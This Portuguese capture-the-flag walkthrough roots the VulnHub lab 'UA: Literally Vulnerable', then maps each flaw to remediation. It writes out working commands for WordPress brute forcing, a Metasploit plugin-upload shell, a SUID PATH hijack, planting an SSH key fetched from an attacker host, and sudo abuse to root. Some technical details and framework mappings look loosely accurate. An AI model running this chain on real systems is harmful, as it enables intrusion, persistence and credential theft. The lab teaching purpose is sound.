# UA: Literally Vulnerable — O Nome Já Diz Tudo

Mano, o nome "Literally Vulnerable" não é ironia, véi. Esta máquina ucraniana empilha login FTP anônimo que vaza uma lista de senhas, brute force no WordPress com essas mesmas credenciais, upload de plugin via Metasploit para um Meterpreter, exploração de binário SUID com PATH hijack para movimentação lateral, injeção de chave SSH, credenciais em base64 num diretório oculto, e uma regra sudo que deixa você substituir um HTML por bash. Literalmente cada configuração errada que existe, empilhada uma em cima da outra. Top demais pra aprender fundamentos. Valeu ao criador.

| Campo | Valor |
|---|---|
| **Nível** | Fácil/Médio |
| **VM Alvo** | UA: Literally Vulnerable |
| **VM Atacante** | Kali Linux |
| **URL VulnHub** | https://www.vulnhub.com/entry/ua-literally-vulnerable,508/ |
| **Técnicas** | Login FTP anônimo, enumeração de usuários WordPress, brute force WPScan, Metasploit wp_admin_shell_upload, SUID PATH hijack, injeção de chave SSH, recuperação de credencial base64, substituição de HTML via sudo |
| **CVEs** | CWE-287 (auth FTP anônima), CWE-434 (upload plugin WordPress RCE), CWE-269 (sudo misconfigured), CWE-522 (credenciais em base64) |
| **Grupos APT** | FIN7, APT28 (Fancy Bear): exploram cadeia de credenciais e upload via app web autenticado |

---

## Resumo do Ataque

```
nmap → FTP 21 (anônimo), SSH 22, Nginx 80, Apache 65535 (WordPress)
  → FTP anônimo → backupPasswords
  → /etc/hosts: literally.vulnerable → wpscan → notadmin, maybeadmin
  → brute force → notadmin:Pa$$w0rd13!&
  → Metasploit wp_admin_shell_upload → Meterpreter (www-data)
  → SUID /home/doe/itseasy (chama 'pwd' sem caminho absoluto)
  → PATH/PWD hijack → shell como john
  → injeção chave SSH → SSH estável como john
  → ~/.local/share/tmpFiles/myPassword → base64 -d → senha do john
  → user.txt
  → sudo -l: john pode rodar /var/www/html/test.html como root
  → echo "/bin/bash" > /var/www/html/test.html → sudo → root
  → /root/root.txt
```

---

## Metodologia

1. Scan completo de portas para identificar todos os serviços
2. Login FTP anônimo: recuperar lista de senhas
3. Configuração de `/etc/hosts` para resolução do vhost
4. Enumeração de usuários WordPress com WPScan
5. Brute force no WordPress com a lista recuperada
6. Shell Meterpreter via `wp_admin_shell_upload`
7. Enumeração de binários SUID: identificar PATH hijack em `/home/doe/itseasy`
8. Movimentação lateral para `john` via manipulação de PATH/PWD
9. Injeção de chave SSH para sessão estável como `john`
10. Descoberta de credencial oculta via decodificação base64
11. Abuso de regra sudo: sobrescrever HTML com bash, escalar para root

---

## Passo 1 — Descoberta e Scan Completo de Portas

```bash
sudo netdiscover -r 192.168.1.0/24
# Alvo: 192.168.1.103

nmap -p- -A 192.168.1.103
```

```
PORT      STATE SERVICE  VERSION
21/tcp    open  ftp      vsftpd 3.0.3 (login anônimo permitido)
22/tcp    open  ssh      OpenSSH 7.x
80/tcp    open  http     nginx
65535/tcp open  http     Apache 2.4.x (WordPress)
```

A porta 65535 para Apache é uma tentativa deliberada de esconder o WordPress. O flag `-p-` garante que você encontre. Sempre scan completo, rapaziada.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Login FTP Anônimo e Lista de Senhas

```bash
ftp 192.168.1.103
# Usuário: anonymous
# Senha: (em branco ou anonymous)

ftp> ls -la
ftp> get backupPasswords
ftp> bye

cat backupPasswords
```

O arquivo contém uma wordlist de senhas. vsftpd rodando com `anonymous_enable=YES` sem nenhuma restrição: o servidor FTP é essencialmente um compartilhamento público servindo material de credencial pronto para o atacante.

**MITRE ATT&CK:** T1078.001 — Contas Válidas: Contas Padrão

---

## Passo 3 — Enumeração WordPress via VHost

```bash
echo "192.168.1.103 literally.vulnerable" >> /etc/hosts
wpscan --url http://literally.vulnerable:65535/phpcms/ --enumerate u
```

Dois usuários descobertos: `notadmin` e `maybeadmin`. Os próprios nomes sugerem que nenhum deveria ter acesso admin, mas provavelmente têm.

**MITRE ATT&CK:** T1592 — Coletar Informações do Host Vítima

---

## Passo 4 — Brute Force no WordPress

```bash
wpscan --url http://literally.vulnerable:65535/phpcms/ \
  -U notadmin,maybeadmin \
  -P backupPasswords
```

Resultado:

```
[SUCCESS] notadmin : Pa$$w0rd13!&
```

Após login, verificar rascunhos no dashboard do WordPress: páginas em rascunho às vezes contêm notas de desenvolvedor com credenciais adicionais.

**MITRE ATT&CK:** T1110.001 — Força Bruta: Adivinhação de Senhas

---

## Passo 5 — Shell via Upload de Plugin WordPress (Metasploit)

```bash
msfconsole -q
use exploit/unix/webapp/wp_admin_shell_upload
set RHOSTS literally.vulnerable
set RPORT 65535
set TARGETURI /phpcms
set USERNAME notadmin
set PASSWORD Pa$$w0rd13!&
exploit
```

Sessão Meterpreter abre como `www-data`:

```bash
meterpreter > shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

O módulo `wp_admin_shell_upload` comprime um plugin PHP malicioso, faz upload via interface admin e o ativa. Exatamente como grupos de ransomware comprometem sites WordPress: autenticar, instalar plugin malicioso, executar.

**MITRE ATT&CK:** T1190 — Explorar Aplicação de Face Pública; T1059.004 — Shell Unix

---

## Passo 6 — PATH Hijack no Binário SUID (Movimento Lateral para john)

```bash
find / -perm -u=s -type f 2>/dev/null
```

Encontra `/home/doe/itseasy` com SUID bit, dono `john`. Inspecionar:

```bash
strings /home/doe/itseasy
# Referências a 'pwd' sem caminho absoluto
cat /home/doe/noteFromAdmin
```

O binário chama `pwd` sem caminho absoluto, então busca no `$PATH`. Configurar `$PWD` com export:

```bash
export PWD=$(/bin/bash)
cd /home/doe
./itseasy
```

Shell como `john` retornado. Funciona porque o SUID executa como `john`, e o PATH hijack faz ele rodar nosso comando controlado.

**Alternativa:**

```bash
echo '/bin/bash' > /tmp/pwd
chmod +x /tmp/pwd
export PATH=/tmp:$PATH
/home/doe/itseasy
```

**MITRE ATT&CK:** T1574.007 — Desvio de Fluxo de Execução: Interceptação por Variável PATH

---

## Passo 7 — Injeção de Chave SSH para Acesso Estável

```bash
# Na máquina atacante:
ssh-keygen -t rsa -f /tmp/johnkey -N ""
python3 -m http.server 8000

# No alvo como john:
mkdir -p /home/john/.ssh
chmod 700 /home/john/.ssh
wget http://192.168.1.ATACANTE:8000/johnkey.pub -O /home/john/.ssh/authorized_keys
chmod 600 /home/john/.ssh/authorized_keys

# Na máquina atacante:
ssh -i /tmp/johnkey john@192.168.1.103
```

**MITRE ATT&CK:** T1098.004 — Manipulação de Conta: Chaves Autorizadas SSH

---

## Passo 8 — Descoberta de Credencial Oculta via Base64

```bash
find /home/john -name ".*" -type d 2>/dev/null
ls -la /home/john/.local/share/tmpFiles/
cat /home/john/.local/share/tmpFiles/myPassword
echo "am9objpZWlckczhZNDlJQiNaWko=" | base64 -d
# john:YZW$s8Y49IB#ZZJ
cat /home/john/user.txt
```

Segurança por obscuridade: base64 é codificação, não criptografia. Qualquer pessoa com acesso de leitura ao arquivo recupera o texto em claro instantaneamente.

**MITRE ATT&CK:** T1552.001 — Credenciais em Arquivos

---

## Passo 9 — Escalação de Privilégios: Substituição de HTML via Sudo

```bash
sudo -l
# john pode executar: (root) NOPASSWD: /var/www/html/test.html
```

A regra permite `john` executar `/var/www/html/test.html` como root. Mas `test.html` está dentro do web root, gravável por `www-data`. Substituir por invocação de bash:

```bash
echo "/bin/bash" > /var/www/html/test.html
chmod 755 /var/www/html/test.html
sudo /var/www/html/test.html
id
# uid=0(root)
cat /root/root.txt
```

(☞ﾟヮﾟ)☞ Root. Literalmente toda anti-prática de sudo em uma única regra.

**MITRE ATT&CK:** T1548.003 — Mecanismo de Controle de Elevação: Sudo

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado Em | Observações |
|---|---|---|---|
| Credencial WordPress | notadmin:Pa$$w0rd13!& | Brute WPScan + lista FTP | Login admin porta 65535 |
| Senha john (base64) | john:YZW$s8Y49IB#ZZJ | ~/.local/share/tmpFiles/myPassword | Codificada em base64 |
| user.txt | (varia por instância) | /home/john/user.txt | Após movimento lateral |
| root.txt | (varia por instância) | /root/root.txt | Após privesc sudo |

---

## Lições Aprendidas

| # | Descoberta | Relevância no Mundo Real | Conclusão |
|---|---|---|---|
| 1 | FTP anônimo expondo lista de senhas | Servidores FTP com acesso anônimo ainda aparecem em testes de intrusão; exposição de listas de credenciais habilita ataques subsequentes diretamente | Desabilitar FTP anônimo; migrar para SFTP com autenticação por chave |
| 2 | Brute force WordPress com wordlist da aplicação | Atacantes reutilizam senhas vazadas contra logins de CMS; WPScan está em todo toolkit | Habilitar 2FA no admin; fail2ban no wp-login.php; atualizar todos os plugins |
| 3 | Upload de plugin Metasploit via credenciais roubadas | Grupos de ransomware usam upload de plugin autenticado como técnica padrão | Manter WordPress e plugins atualizados; monitorar wp-content/plugins |
| 4 | Binário SUID com caminho relativo (PATH hijack) | PATH hijack via SUID é privesc de complexidade média encontrado em ferramentas internas personalizadas | Usar sempre caminhos absolutos em binários SUID; auditar permissões SUID trimestralmente |
| 5 | Regra sudo em arquivo gravável pelo web server | sudo em arquivo gravável por usuários menos privilegiados cria privesc trivial | Nunca conceder sudo em arquivos dentro do web root |
| 6 | Senha em base64 em diretório oculto | Base64 é codificação, não criptografia: recuperação imediata com acesso de leitura | Usar gerenciador de segredos; nunca armazenar senhas em texto puro ou base64 no disco |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Acesso Inicial | Acesso Inicial | Explorar Aplicação de Face Pública | T1190 |
| Acesso a Credenciais | Acesso a Credenciais | Força Bruta: Adivinhação de Senhas | T1110.001 |
| Acesso a Credenciais | Acesso a Credenciais | Credenciais em Arquivos | T1552.001 |
| Execução | Execução | Shell Unix | T1059.004 |
| Persistência | Persistência | Chaves Autorizadas SSH | T1098.004 |
| Movimento Lateral | Movimento Lateral | Interceptação por Variável PATH | T1574.007 |
| Escalação de Privilégios | Escalação de Privilégios | Sudo: Mecanismo de Controle de Elevação | T1548.003 |

---

## Remediação e Contenção

### Correções Técnicas

1. Desabilitar FTP anônimo: `anonymous_enable=NO` em `/etc/vsftpd.conf`; migrar para SFTP
2. Hardening WordPress: habilitar 2FA no admin; fail2ban para wp-login.php; atualizar todos os plugins
3. Remover plugin plantado pelo Metasploit: verificar `wp-content/plugins/` por diretórios inesperados
4. Auditar binários SUID: `find / -perm -4000 -type f 2>/dev/null`; usar caminhos absolutos
5. Corrigir sudoers: remover NOPASSWD em arquivos graváveis pelo web server
6. Remover credenciais no filesystem: purgar arquivos base64; implementar gestão de segredos

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gestão de Ativos | Inventariar todos os serviços FTP e aplicações web |
| Proteger | Controle de Acesso | Desabilitar FTP anônimo; 2FA no WordPress; restringir sudo |
| Proteger | Segurança de Dados | Remover credenciais em texto puro/base64 do filesystem |
| Detectar | Anomalias e Eventos | Monitorar logins FTP; alertar em novos plugins WordPress; registrar uso de sudo |
| Responder | Planejamento de Resposta | Remover webshells; rotacionar credenciais expostas |
| Recuperar | Planejamento de Recuperação | Reconstruir host comprometido; auditar todas as contas e permissões |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| AC-3 | Aplicação de Acesso | Desabilitar FTP anônimo; restringir permissões de escrita no web directory |
| AC-6 | Menor Privilégio | Remover SUID de binários customizados; restringir sudo a comandos seguros e mínimos |
| IA-5 | Gestão de Autenticadores | Rotacionar credenciais expostas; senhas fortes; 2FA |
| CM-7 | Menor Funcionalidade | Desabilitar FTP anônimo; restringir tipos de upload |
| SC-28 | Proteção de Informação em Repouso | Nunca armazenar senhas em texto puro ou base64 no disco |

### CISA KEV

A combinação de upload de plugin WordPress RCE e exposição de credenciais via FTP anônimo mapeia para padrões no Alerta CISA AA22-074A sobre acesso inicial via vulnerabilidades em aplicações web.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gestão de Identidade e Acesso (IAM) | Gerenciar Privilégios e Contas | MIL3 |
| Gestão de Ameaças e Vulnerabilidades (THREAT) | Realizar Avaliações de Vulnerabilidade | MIL2 |
| Gestão de Ativos, Mudanças e Configuração (ASSET) | Gerenciar Inventário de Ativos de TI | MIL2 |

### MITRE D3FEND

- **D3-ACH** — Hardening de Configuração de Aplicação (FTP anônimo; sudo)
- **D3-OAM** — Gestão Administrativa do Sistema Operacional (auditoria SUID; hardening sudoers)
- **D3-HBPI** — Integridade do Pipeline de Build (sem credenciais em paths web-acessíveis)

---

## Considerações Finais

UA: Literally Vulnerable faz jus ao nome completamente. Cada vulnerabilidade nessa máquina é um exemplo de manual do que não fazer, empilhado em uma cadeia que não requer zero-days nem exploração avançada: só enumeração, paciência e conhecer seus GTFOBins. A cadeia FTP-para-WordPress-para-SUID-para-sudo é exatamente o caminho de ataque que você encontra em ambientes reais onde segurança nunca foi prioridade.

A lição: atacantes não precisam de sofisticação quando os defensores entregam um roteiro. Corrija os fundamentos.

Thanks guys!! (❍ᴥ❍ʋ)
